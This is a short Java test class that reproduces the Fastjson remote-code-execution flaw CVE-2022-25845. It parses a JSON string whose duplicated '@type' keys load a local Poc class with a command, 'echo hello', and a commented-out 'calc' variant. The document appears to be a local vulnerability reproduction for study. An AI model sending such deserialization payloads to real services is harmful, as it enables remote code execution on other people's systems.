package com.yichen.casetest.bugtest.fastjson;

import com.alibaba.fastjson.JSON;

import java.io.IOException;

/**
 * @author Qiuxinchao
 * @version 1.0
 * @date 2022/9/16 9:06
 * @describe CVE-2022-25845   远程执行代码
 */
public class FastJsonTest {

    public static void main(String[] args) {
//        String json = "{\"@type\":\"java.lang.Exception\",\"@type\":\"com.yichen.casetest.bugtest.fastjson.Poc\",\"name\":\"calc\"}";
        String json = "{\"@type\":\"java.lang.Exception\",\"@type\":\"com.yichen.casetest.bugtest.fastjson.Poc\",\"name\":\"echo hello\"}";
        JSON.parse(json);
    }
}
